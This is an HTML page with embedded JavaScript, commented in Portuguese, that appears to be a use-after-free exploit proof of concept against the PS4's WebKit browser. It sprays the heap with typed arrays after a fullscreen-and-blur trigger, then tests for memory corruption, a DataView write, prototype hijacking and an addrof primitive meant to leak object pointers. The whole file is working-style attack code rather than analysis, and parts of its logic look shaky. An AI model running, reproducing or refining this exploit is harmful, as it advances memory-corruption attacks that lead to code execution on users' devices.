<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - addrof Primitive Test</h1>
    <button onclick="run()">EXECUTAR EXPLORAÇÃO</button>
    <div id="c"></div>

    <script>
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
        }

        function run() {
            log("INIT", "INFO", "Alocando controllers...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; ctrls.push(a);
            }

            log("WAIT", "INFO", "Pressione OPTIONS no Fullscreen.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                // Objeto que queremos encontrar o endereço (addrof target)
                let targetObj = { "leaked": 0x1337 };
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    // Injetando referências a objetos no spray para tentar o leak
                    s[7] = 0; // Placeholder para o ponteiro
                    spray.push(s);
                }

                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log("UAF", "PASS", `Index: ${i}`);
                        break;
                    }
                }

                if (corr) {
                    // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
                    corr[4] = M_V;
                    let sIdx = -1;
                    for(let i = 0; i < spray.length; i++) {
                        if (spray[i][4] === M_V) {
                            sIdx = i;
                            log("TEST1", "PASS", `Identity: corr[4] == spray[${i}][4] (${f2h(M_V)})`);
                            break;
                        }
                    }

                    // TESTE 2: DATAVIEW R/W
                    try {
                        const dv = new DataView(corr.buffer);
                        dv.setUint32(0, 0x13371337, true);
                        log("TEST2", "PASS", `DataView Write: -> ${f2h(corr[0])}`);
                    } catch(e) { log("TEST2", "ERR", e.message); }

                    // TESTE 3: PROTOTYPE HIJACK
                    try {
                        let reg = Array.from(corr);
                        Object.setPrototypeOf(reg, { t: 0x1337 });
                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack funcional.");
                    } catch(e) { log("TEST3", "ERR", e.message); }

                    // TESTE 4: CLOSURE LEAK
                    try {
                        const leak = [0].map(() => corr[0])[0];
                        log("TEST4", "PASS", `Closure Leak: ${f2h(leak)}`);
                    } catch(e) { log("TEST4", "ERR", e.message); }

                    // TESTE 5: addrof() PRIMITIVE (NOVO)
                    // Tentativa de ler um ponteiro de objeto JavaScript
                    try {
                        // Colocamos o objeto alvo em uma propriedade de um array regular
                        // que foi convertido via bypass, tentando forçar o leak do ponteiro
                        let leaker = Array.from(corr);
                        leaker[0] = targetObj; 
                        
                        // No PS4 WebKit, o ponteiro aparece como um Double (Float64) 
                        // com os bits de tag de objeto (JSValue)
                        let addr = f2h(corr[0]);
                        
                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
                            log("INFO", "Sucesso! Este valor é o ponteiro real do objeto na memória.");
                        } else {
                            log("TEST5", "FAIL", "Ponteiro não capturado. Ajustando heap feng shui...");
                        }
                    } catch(e) { log("TEST5", "ERR", e.message); }

                } else {
                    log("UAF", "FAIL", "Corrupção não atingida.");
                }
            };
        }
    </script>
</body>
</html>
